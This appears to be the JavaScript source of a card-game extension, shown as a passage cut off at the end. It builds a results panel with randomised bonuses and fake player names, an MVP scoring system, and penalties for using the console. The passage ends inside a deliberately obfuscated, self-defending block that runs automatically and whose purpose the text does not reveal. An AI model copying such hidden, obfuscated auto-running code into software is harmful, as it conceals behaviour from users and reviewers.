                                return target.identity == 'fan';
                            });
                            break;
                    }
                }
            } else if (mode == 'guozhan') {
                if (player.identity == 'ye') {
                    targets = [];
                } else {
                    var group = lib.character[player.name1][1];
                    targets = game.filterPlayer2(function (target) {
                        if (func && !func(target)) return false;
                        return target.identity != 'ye' && lib.character[target.name1][1] == group;
                    });
                }
            } else if (mode == 'doudizhu') {
                targets = game.filterPlayer2(function (target) {
                    if (func && !func(target)) return false;
                    return target.identity == player.identity;
                });
            } else {
                targets = game.filterPlayer2(function (target) {
                    if (func && !func(target)) return false;
                    return target.side == player.side;
                });
            }
            if (self) {
                targets.add(player);
            } else {
                targets.remove(player);
            }
            return targets;
        }

        lib.qingyaoOverPanel = function (resultbool) {
            /* 关闭原来的结算框 */
            ui.dialogs && ui.dialogs.length > 0 && ui.dialogs[0].close();
            if (!_status.qyGameResultControl) {
                _status.qyGameResultControl = ui.create.control('显示结算面板', event => {
                });
                _status.qyGameResultControl.isHidden = true;
                _status.qyGameResultControl.addEventListener('click', function () {
                    const isHidden = _status.qyGameResultControl.isHidden = !_status.qyGameResultControl.isHidden;
                    qy_game_result_bg.classList.toggle('qy_hidden', isHidden);
                    qy_game_result.classList.toggle('qy_hidden', isHidden);
                    this.childNodes[0].innerText = `${isHidden ? '显示' : '隐藏'}结算面板`
                })
            }
            /*  */
            const qy_game_result_bg = ui.create.div('.qy_game_result_bg.qy_hidden', ui.arena);
            const qy_game_result = ui.create.div('.qy_game_result.qy_hidden', ui.arena);
            /* 旗帜 */
            const qy_game_result_banner = ui.create.div('.qy_game_result_banner', qy_game_result);

            /* 等级经验加成 */
            function createTableTrTd(qy_game_result_banner_info_table, trList) {
                const table = ui.create.table(qy_game_result_banner_info_table)
                for (let tds of trList) {
                    const tr = ui.create.node('tr', table);
                    for (let td of tds) {
                        ui.create.node('td', '', td, tr);
                    }
                }
                return table;
            }

            !function 等级经验加成() {
                const qy_game_result_banner_info_container = ui.create.div('.qy_game_result_banner_info_container', qy_game_result_banner);
                ui.create.div('.qy_game_result_banner_info_title', qy_game_result_banner_info_container, '等级经验加成');
                const qy_game_result_banner_info_table = ui.create.div('.qy_game_result_banner_info_table', qy_game_result_banner_info_container);
                createTableTrTd(qy_game_result_banner_info_table, [['会员', `(+${get.rand(0, 100)})`], ['多多益善', `(+50)`], ['皮肤', `(+${get.rand(0, 100)})`], ['星级', `(+${get.rand(0, 100)})`], ['公会组队', `(+${get.rand(0, 100)})`]])
            }()
            !function 星级经验加成() {
                const qy_game_result_banner_info_container = ui.create.div('.qy_game_result_banner_info_container', qy_game_result_banner);
                ui.create.div('.qy_game_result_banner_info_title', qy_game_result_banner_info_container, '星级经验加成');
                const qy_game_result_banner_info_table = ui.create.div('.qy_game_result_banner_info_table', qy_game_result_banner_info_container);
                createTableTrTd(qy_game_result_banner_info_table, [['公会组队', `(+${get.rand(0, 100)})`], ['星级', `(+${get.rand(0, 100)})`], ['皮肤', `(+10)`]])
            }()

            function getCamp(playerItem) {
                switch (get.mode()) {
                    case 'guozhan':
                        return `.qy_game_result_fraction_item_group_${playerItem.group}`;
                    case 'doudizhu':
                        return `.qy_game_result_fraction_item_doudizhu_${playerItem.identity}`;
                    default:
                        return `.qy_game_result_fraction_item_identity_${playerItem.identity}`;
                }
            }

            // 随机武将名称
            const playerNameList = ['坤回太初', '多云转晴🦆', '清瑶姐姐', '梨花喵', '缘空酱酱', 'WwW.com', '风回太初', 'ENGJ.K', '南街北巷',
                '只因无中', '翘课切片大师', '东方太白', '戴夫酱', '遍野繁花', '枫林残夜', '南桐雷子', '四糸奶', '丞相蒸', '明月栖木', '代码废物',
                '路卡🥜酱', '萝北酱酱', '夕酱太初', '某个萌新', '铁子 你把握不住', '女宝', '黄老板', '熊猫猫花花', '🐗', '羊羊', '🔥🐱', '鬼鬼鬼鬼', '大卫·戴'];

            function createPlayerTableItem(playerItem, sourcenode) {
                const tr = ui.create.node('tr', sourcenode);
                /* 势力 */
                ui.create.div(ui.create.node(`td`, {padding: 0}, tr), `.qy_game_result_fraction_item${getCamp(playerItem)}`);
                let playerName = get.translation(playerItem);
                if (game.me === playerItem) playerName = lib.config.connect_nickname + "(本人)";
                /* 武将名称 -- 随机武将名称 */
                ui.create.node('td', game.me === playerItem ? playerName : playerNameList.randomRemove(), tr);
                /* 等级经验 */
                const showMvpCount = (playerItem.mvpCount - 100 > 0 ? '+' : '') + (playerItem.mvpCount - 100);
                ui.create.node('td', `${showMvpCount}`, tr);
                /* 武将星级 */
                const playerXing = ui.create.node(`td`, tr);
                ui.create.div('.qy_game_result_character_name', get.translation(playerItem.name1), playerXing);
                const qy_game_result_xing_container = ui.create.div('.qy_game_result_xing_container', playerXing);
                /* 星 */
                const qyRateNum = get.qyRateNum(playerItem.name1);
                for (let num = 0; num < qyRateNum; num++) {
                    ui.create.div('.qy_game_result_xing.qy_xing_light', qy_game_result_xing_container);
                }
                for (let i = 0; i < 5 - qyRateNum; i++)
                    ui.create.div('.qy_game_result_xing.qy_xing_gray', qy_game_result_xing_container);

                /* 星级经验 */
                ui.create.node('td', `+${get.rand(0, 100)}`, tr);
                /* 查看手牌 */
                const qy_game_lookon_eye_td = ui.create.node(`td`, tr, event => {
                    const popupContainer = ui.create.div('.popup-container', ui.window, {
                        zIndex: 15,
                    }, function (event) {
                        event.stopPropagation();
                        this.delete();
                    });
                    var dialog = ui.create.dialog(get.translation(playerItem) + '的手牌：', 'hidden');
                    dialog.css({
                        zoom: .76,
                        backgroundImage: 'linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4))'
                    })
                    const cards = playerItem.getCards('hs');
                    if (cards.length > 0) {
                        dialog.add([cards, 'vcard']);
                    } else {
                        dialog.addText(get.translation(playerItem) + '无手牌');
                    }
                    dialog.classList.remove('forcebutton-auto')
                    dialog.classList.add('popped', 'static');
                    popupContainer.appendChild(dialog);
                })
                const qy_game_lookon_eye_div = ui.create.div(qy_game_lookon_eye_td, {
                    cursor: 'pointer',
                })
                ui.create.div(qy_game_lookon_eye_div, '.qy_game_lookon_eye');
                ui.create.div(qy_game_lookon_eye_div, '.qy_game_lookon_look_text', '查看');
            }

            /* 结算面板 */
            const qy_game_result_fraction_container = ui.create.div('.qy_game_result_fraction_container', qy_game_result);
            ui.create.div(qy_game_result_fraction_container);
            /* 标题 */
            createTableTrTd(qy_game_result_fraction_container, [['阵营', '玩家姓名', '等级经验', '武将', '星级经验', '手牌']]).className = 'qy_game_result_fraction_title';
            /* 胜 字体 */
            ui.create.div('.qy_game_result_fraction_text.qy_game_result_fraction_text_win', qy_game_result_fraction_container);
            const winFailPlayers = (function getWinFailPlayers() {
                // 胜利玩家
                const winPlayers = [];
                // 失败玩家
                const failPlayers = [];
                // 查找到主公
                const zhu = (game.boss || game.zhu || game.me)
                if (!zhu.getAllFriends) {
                    zhu.getAllFriends = lib.element.player.getAllFriends;
                }
                // 主公队友
                const zhuFriends = zhu.getAllFriends(true);
                // 玩家的队友
                const meFirends = game.me.getAllFriends(true);
                // 主公是否存活
                const zhuIsAlive = zhu.isAlive();
                // 存活的玩家
                const gamePlayers = game.players.slice(0);
                const playersDead = game.players.concat(game.dead);
                //
                for (let current of playersDead) {
                    let players = winPlayers;
                    const isZhuFriends = zhuFriends.contains(current);
                    // 主公是主要的人物
                    if (game.zhu || game.boss) {
                        // 主公阵亡了，败方
                        if (!zhuIsAlive) {
                            // 是主公的队友
                            if (isZhuFriends) {
                                players = failPlayers;
                            } else if (current.identity === 'nei') {
                                // 场上存活的玩家不止一个，或者场上存活的玩家不是当前玩家
                                if (gamePlayers.length !== 1 || gamePlayers[0] !== current) {
                                    players = failPlayers;
                                }
                            } else {
                                // 主公的队友全阵亡了，自己和队友也全阵亡了，败方
                                if (zhu.getFriends().length === 0 && current.getFriends().length === 0 && !current.isAlive()) {
                                    players = failPlayers;
                                }
                            }
                        } else if (!isZhuFriends && zhuIsAlive) {// 不是主公的队友 并且 主公还存活着，败方
                            players = failPlayers;
                        }
                    } else {
                        // 国战
                        if (current.identity === 'ye') {
                            // 场上存活的玩家不止一个，或者场上存活的玩家不是当前玩家
                            if (gamePlayers.length !== 1 || gamePlayers[0] !== current) {
                                players = failPlayers;
                            } else if (zhuIsAlive && zhu !== current) { // 主公还存活着 国战下，没有game.zhu，所以自己是主要人物
                                players = failPlayers;
                            }
                        } else {
                            // 你阵亡了，并且存活的玩家没有一个是你的友方
                            if (game.dead.contains(current) && !game.players[0].isFriendsOf(current)) {
                                players = failPlayers;
                            }
                        }
                    }
                    players.add(current);
                }
                return [winPlayers, failPlayers]
            })();
            const winPlayers = winFailPlayers[0];
            const failPlayers = winFailPlayers[1];
            /* 胜玩家 */
            const qy_game_result_fraction_table_win = ui.create.table(qy_game_result_fraction_container, '.qy_game_result_fraction_table_win');
            winPlayers.sort((a, b) => a.mvpCount - b.mvpCount > 0 ? -1 : 1);
            winPlayers.forEach(current => createPlayerTableItem(current, qy_game_result_fraction_table_win))
            /* 败 字体 */
            ui.create.div('.qy_game_result_fraction_text.qy_game_result_fraction_text_fail', qy_game_result_fraction_container);
            /* 败玩家 */
            const qy_game_result_fraction_table_fail = ui.create.table(qy_game_result_fraction_container, '.qy_game_result_fraction_table_fail');
            failPlayers.sort((a, b) => a.mvpCount - b.mvpCount > 0 ? -1 : 1);
            failPlayers.forEach(current => createPlayerTableItem(current, qy_game_result_fraction_table_fail));
        }
        "use strict;"
        lib.onover.push(resultbool => {
            // 所有角色增加游戏次数
            game.players.concat(game.dead).forEach(current => {
                lib.qyMvpWinningRate.getAndAddGame(current.name1);
                if (current.name2) {
                    lib.qyMvpWinningRate.getAndAddGame(current.name2);
                }
            });
            if (game.getExtensionConfig('假装无敌', 'qingyaoOverPanel')) {
                // 仅支持，身份局，国战，斗地主，挑战boss，2v2模式
                if (['identity', 'guozhan', 'doudizhu', 'boss'].contains(get.mode()) || ('versus' === get.mode() && _status.mode === 'two')) {
                    lib.qingyaoOverPanel(resultbool);
                }
            }
            ui.create.control("手杀MVP", () => _status.手杀MVP());
            _status.手杀MVP();
            // 增加结算获得将魂
            const maxCharacterSoul = 2000_000;
            let qyCharacterSoul = lib.qyUtils.getConfig('qyCharacterSoul', 200_000);
            if (qyCharacterSoul >= maxCharacterSoul) {
                return;
            }
            qyCharacterSoul += Boolean(resultbool) ? 20_000 * 5 : 20_000;
            qyCharacterSoul = Math.min(maxCharacterSoul, qyCharacterSoul)
            game.saveExtensionConfig('假装无敌', 'qyCharacterSoul', qyCharacterSoul);
        });
        ['攻击分数', '治疗分数', '辅助分数', '惩罚扣分'].forEach(value => {
            HTMLDivElement.prototype[value] = 0;
        });
        HTMLDivElement.prototype.局势分数 = 100;
        Object.defineProperty(HTMLDivElement.prototype, 'mvpCount', {
            get: function () {
                return this.攻击分数 + this.治疗分数 + this.辅助分数 + this.局势分数 - this.惩罚扣分;
            },
            set: function () {
            },
        });
        lib.skill['_qy-mvp-effect1'] = {
            trigger: {
                player: ['useCard', 'changeHp'],
            },
            direct: true,
            forced: true,
            firstDo: true,
            silent: true,
            popup: false,
            filter: function (event, player, name) {
                if (name === 'useCard') {
                    if (!event.card) return false;
                    if (get.tag({name: event.card.name}, 'damage')) return true;
                    if (event.card.name === 'wuxie') return true;
                    if (get.info(event.card).toself || get.type(event.card) !== 'trick') return false;
                    if (get.info(event.card).selectTarget === -1 || get.info(event.card).selectTarget > 1) return true;
                    return false;
                } else {
                    if (!['清瑶Damage', 'damage'].contains(event.getParent().name)) return false;
                    if (!event.getParent().source || !event.getParent().source.isIn()) return false;
                    if (event.getParent().player == event.getParent().source) return false;
                    if (event.getParent().source.identity == 'nei') return true;
                    return get.attitude(event.getParent().source, event.getParent().player) < 0;
                }
            },
            content: function () {
                if (event.triggername === 'changeHp') {
                    if (get.attitude(trigger.getParent().source, trigger.getParent().player) < 0 || trigger.getParent().source.identity == 'nei') trigger.num < -5 ? trigger.getParent().source.攻击分数 += 15 : trigger.getParent().source.攻击分数 += 3 * -trigger.num;
                } else if (trigger.card) {
                    if (get.tag({name: trigger.card.name}, 'damage'))
                        player.攻击分数 += 2
                    if (trigger.card.name === 'wuxie')
                        player.辅助分数 += 2;
                    if ((get.info(trigger.card).selectTarget === -1 || get.info(trigger.card).selectTarget > 1) && (!get.info(trigger.card).toself && get.type(trigger.card) === 'trick'))
                        player.辅助分数 += 1;
                }
            }
        }
        lib.skill['_qy-mvp-effect2'] = {
            trigger: {player: ['gainEnd', 'discardEnd']},
            direct: true,
            forced: true,
            firstDo: true,
            silent: true,
            popup: false,
            filter: function (event, player, name) {
                if (name === 'gainEnd') {
                    if (!event.source || event.source == player || !event.source.isIn()) return false;
                    //var evt=event.getl(event.source);
                    //if(!evt&&!evt.cards2&&evt.cards2.length===0) return false;
                    if (!event.cards || event.cards.length == 0) return false;
                    if (event.source.identity == 'nei') return true;
                    return event.player.getEnemies().contains(event.source);
                }
                if (name === 'discardEnd') {
                    if (!event.source || event.source == player || !event.source.isIn()) return false;
                    //var evt=event.getl(event.source);
                    //if(!evt&&!evt.cards2&&evt.cards2.length===0) return false;
                    if (!event.cards || event.cards.length == 0) return false;
                    if (event.source.identity == 'nei') return true;
                    return event.player.getEnemies().contains(event.source);
                }
            },
            content: function () {
                if (event.triggername == 'gainEnd') trigger.player.辅助分数 += 1 * trigger.cards.length;
                if (event.triggername == 'discardEnd') trigger.source.辅助分数 += 1 * trigger.cards.length;
            },
        }
        lib.skill['_qy-mvp-effect3'] = {
            trigger: {
                player: ['changeHp']
            },
            direct: true,
            forced: true,
            firstDo: true,
            silent: true,
            popup: false,
            filter: function (event, player) {
                if (!['清瑶recover', 'recover'].contains(event.getParent().name)) return false;
                if (!event.getParent().source || !event.getParent().source.isIn()) return false;
                if (event.getParent().source.identity == 'nei') return true;
                return event.getParent().player.getFriends().contains(event.getParent().source) || event.getParent().player == event.getParent().source;
            },
            content: function () {
                trigger.num > 5 ? trigger.getParent().source.治疗分数 += 10 : trigger.getParent().source.治疗分数 += 2 * trigger.num;
            },
        }
        lib.skill['_qy-mvp-effect4'] = {
            trigger: {source: ['dieBegin', 'die']},
            direct: true,
            forced: true,
            firstDo: true,
            silent: true,
            popup: false,
            filter: function (event, player) {
                return (event.source && event.source.isIn() && !event['_qy-mvp-effect4']);
            },
            content: function () {
                trigger['_qy-mvp-effect4'] = true;
                if (trigger.player.getFriends().contains(trigger.source)) {
                    trigger.source.惩罚扣分 += 5;
                    if (trigger.source.identity == 'nei' && trigger.player.identity != 'zhu') {
                        trigger.source.惩罚扣分 -= 5;
                        trigger.source.攻击分数 += 3;
                    }
                }
                if (trigger.player.getEnemies().contains(trigger.source)) {
                    trigger.source.攻击分数 += 3;
                }
            },
        }
        lib.skill['_qy-mvp-effect5'] = {
            trigger: {
                player: "enterGame",
                global: ["roundStart", "gameStart"],
            },
            direct: true,
            forced: true,
            priority: Infinity,
            firstDo: true,
            silent: true,
            popup: false,
            content: function () {
                if (!_status._qy_mvp_effect5) {
                    try {
                        var changValue = false;
                        var input = ui.commandnode.link.querySelector("input");
                        var Opt = Object.getOwnPropertyDescriptor(input.__proto__, "value");
                        Object.defineProperty(input, 'value', {
                            get: function () {
                                var value = (Opt.get && Opt.get.call(this)) || '';
                                if (value === '') changValue = false;
                                else changValue = true
                                return value;
                            },
                            set: function (v) {
                                Opt.set.call(this, v);
                            },
                            configurable: true,
                        })
                        Array.from(ui.commandnode.parentElement.parentElement.querySelectorAll(".menubutton.round.highlight")).forEach(value => {
                            value.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function (event) {
                                if ('作' === value.innerText && this.classList.contains('glowing')) {
                                    game.me.惩罚扣分 += 3;
                                } else if ('执' === value.innerText && changValue) {
                                    game.me.惩罚扣分 += 3;
                                }
                            }, true);
                        })
                    } catch (e) {
                        console.error("作弊加载失败：", e)
                    }
                    _status._qy_mvp_effect5 = true;
                }
            },
        };
    }

    window.JzwdAnimation = function (app, name, position) {
        return JzwdPlayAnimDelay(name, position, null, null);
    }
    window.JzwdPlayAnimDelay = function (name, time, position, qyAnimation) {
        console.error("【假装无敌】特效加载失败", name, position);
        game.print("【假装无敌】特效加载失败", name, position)
    }

    let loadAnimationPromise = lib.reqXHR('js/animation/animation.js')
        .then(xhr => {
            new Function('lib', 'game', 'ui', 'get', 'ai', '_status', 'self', xhr.responseText)(lib, game, ui, get, ai, _status, window)
            return Promise.resolve(true);
        }, error => {
            lib.JzwdLoadJSOnerror.push({file: 'animation.js', message: '文件不存在，请使用万能导入！'});
        });

    Object.assign(window, {
        JzwdWebWorkerOrMainWorker(){},
        JzwdWebWorkerDestroySpine(){},
        JzwdWebWorkerMergeConfig(){},
    });

    // 播放骨骼主要函数
    lib.qyArenaReadyPushOrRunStart(() => {
        function createLibQyWebView(){
            const canvasParentDivAppendArena = lib.qyPlayerAppContainer = ui.create.div('#Jzwd-canvas-animation-parent-div', ui.arena);
            const qyPlayerAppRestToBody = game.getExtensionConfig('假装无敌', 'qyPlayerAppRestToBody') && false;
            // 是否支持Worker必备条件
            if (HTMLCanvasElement.prototype.transferControlToOffscreen) {
                const canvasElement = document.createElement('canvas');
                canvasParentDivAppendArena.appendChild(canvasElement);
                canvasElement.style.zIndex = 9;
                canvasElement.width = document.body.clientWidth
                canvasElement.height = document.body.clientHeight;

                const canvasOffscreen = canvasElement.transferControlToOffscreen();
                let baseUrl
                if (lib.qyUtils.isMobile) {
                    baseUrl = lib.assetURL.slice(0, lib.assetURL.length - 1)
                } else {
                    baseUrl = window.location.href.slice(0, window.location.href.lastIndexOf('/'))
                }
                lib.qyWebWorker.postMessage({
                    action: qyWorkerAction.CREATE,
                    data: {
                        id: 1,
                        canvas: canvasOffscreen,
                        resolution: Math.max(window.devicePixelRatio * (window.documentZoom ? window.documentZoom : 1), 1),
                        // pathPrefix: `${lib.assetURL || globalThis.__dirname + '/'}extension/清瑶葭绮/members/假装无敌/animation/`
                        ...lib.qyWorkerLoadEnv,
                    },
                }, [canvasOffscreen]);
                // 跟随屏幕调整大小
                if (qyPlayerAppRestToBody) {
                    const resizeObserver = new ResizeObserver((entries) => {
                        if (!entries.length) return;
                        lib.qyWebWorker.postMessage({
                            action: qyWorkerAction.REST_APPLICATION_VIEW,
                            data: {
                                id: 1,
                                width: document.body.clientWidth,
                                height: document.body.clientHeight,
                            }
                        });
                    });
                    resizeObserver.observe(document.body);
                }

                return;
            } else {
                console.error("当前设备不支持Woker必备条件");
                if (!game.getExtensionConfig('假装无敌', 'WorkerAlert')) {
                    if (confirm('当前设备不支持Woker必备条件，特效播放可能很卡顿，建议升级一下如果手机过于陈旧建议换新设备，近几年新设备建议升级一下SystemWebView。\n点击确定将不再提示')) {
                        game.saveExtensionConfig('假装无敌', 'WorkerAlert', true);
                    }
                }
            }


            lib.qyPlayerApp = new PIXI.Application({
                width: document.body.clientWidth,
                height: document.body.clientHeight,
                // 背景透明
                backgroundAlpha: 0,
                // 设置抗锯齿
                antialias: true,
                // 设置高性能
                powerPreference: 'high-performance',
                // 像素缩放大小
                resolution: Math.max(window.devicePixelRatio * (window.documentZoom ? window.documentZoom : 1), 1),
                // 设置自动调整大小
                resizeTo: qyPlayerAppRestToBody ? document.body : null,
            });
            canvasParentDivAppendArena.appendChild(lib.qyPlayerApp.view);
        }
        lib.onfree = (lib.onfree || []).concat(() => {
            function li1jfn0z(U,V){var T=li1jfn0T();return li1jfn0z=function(z,m){z=z-0x193;var h=T[z];if(li1jfn0z['YWfSjq']===undefined){var i=function(O){var u='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var K='',X='',s=K+i;for(var g=0x0,v,S,N=0x0;S=O['charAt'](N++);~S&&(v=g%0x4?v*0x40+S:S,g++%0x4)?K+=s['charCodeAt'](N+0xa)-0xa!==0x0?String['fromCharCode'](0xff&v>>(-0x2*g&0x6)):g:0x0){S=u['indexOf'](S);}for(var t=0x0,B=K['length'];t<B;t++){X+='%'+('00'+K['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(X);};var W=function(O,u){var K=[],X=0x0,g,v='';O=i(O);var S;for(S=0x0;S<0x100;S++){K[S]=S;}for(S=0x0;S<0x100;S++){X=(X+K[S]+u['charCodeAt'](S%u['length']))%0x100,g=K[S],K[S]=K[X],K[X]=g;}S=0x0,X=0x0;for(var N=0x0;N<O['length'];N++){S=(S+0x1)%0x100,X=(X+K[S])%0x100,g=K[S],K[S]=K[X],K[X]=g,v+=String['fromCharCode'](O['charCodeAt'](N)^K[(K[S]+K[X])%0x100]);}return v;};li1jfn0z['qGtsXW']=W,U=arguments,li1jfn0z['YWfSjq']=!![];}var r=T[0x0],p=z+r,a=U[p];if(!a){if(li1jfn0z['SHdCsC']===undefined){var O=function(u){this['lXwPFh']=u,this['kVtYDn']=[0x1,0x0,0x0],this['NlNKEU']=function(){return'newState';},this['fxfhQj']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['LrfWax']='[\x27|\x22].+[\x27|\x22];?\x20*}';};O['prototype']['TchsOj']=function(){var u=new RegExp(this['fxfhQj']+this['LrfWax']),K=u['test'](this['NlNKEU']['toString']())?--this['kVtYDn'][0x1]:--this['kVtYDn'][0x0];return this['FVSgud'](K);},O['prototype']['FVSgud']=function(u){if(!Boolean(~u))return u;return this['yGrcwM'](this['lXwPFh']);},O['prototype']['yGrcwM']=function(u){for(var K=0x0,X=this['kVtYDn']['length'];K<X;K++){this['kVtYDn']['push'](Math['round'](Math['random']())),X=this['kVtYDn']['length'];}return u(this['kVtYDn'][0x0]);},new O(li1jfn0z)['TchsOj'](),li1jfn0z['SHdCsC']=!![];}h=li1jfn0z['qGtsXW'](h,m),U[p]=h;}else h=a;return h;},li1jfn0z(U,V);}function li1jfn0T(){var UU=['ptDkW4JdKSkFca','yM9KEq','sNP3zfDLyLDVCMTLCK1LCMDLq29UzMLN','5yAt6zw25OI76ica6kk55yMg6zIT772S','Dg9tDhjPBMC','nw9qC1DeCa','BSockCk8W5WlW7ldPCo0WO7dKYOG','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